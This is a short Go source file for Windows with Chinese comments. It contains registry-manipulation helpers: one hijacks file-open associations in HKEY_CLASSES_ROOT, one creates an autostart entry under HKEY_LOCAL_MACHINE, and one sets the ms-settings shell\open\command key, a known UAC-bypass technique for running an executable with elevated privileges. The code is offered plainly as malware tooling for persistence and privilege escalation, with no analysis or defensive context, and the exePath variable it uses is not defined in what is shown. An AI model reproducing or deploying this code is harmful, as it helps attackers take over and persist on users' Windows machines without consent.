package main

import (
	"golang.org/x/sys/windows/registry"
	"log"
)

// 修改文件打开方式
func changeRegOpenT(path string,  value string) {
	k, err := registry.OpenKey(registry.CLASSES_ROOT, path, registry.ALL_ACCESS)

	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	err = k.SetExpandStringValue("", value)
	if err != nil {
		log.Fatal(err)
	}
}

// 创建自启注册表项
func createRegAutoStart(path string,name string,value string){
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	err= k.SetStringValue(name,value)
	if err!=nil {
		log.Fatal(err)
	}
}

func createRegBypassUAC() {
	k, exist ,err := registry.CreateKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", registry.ALL_ACCESS)
	if exist {
		log.Println("已存在")
	}
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	err = k.SetStringValue("",exePath)
	err= k.SetStringValue("DelegateExecute","")
	if err!=nil {
		log.Fatal(err)
	}
}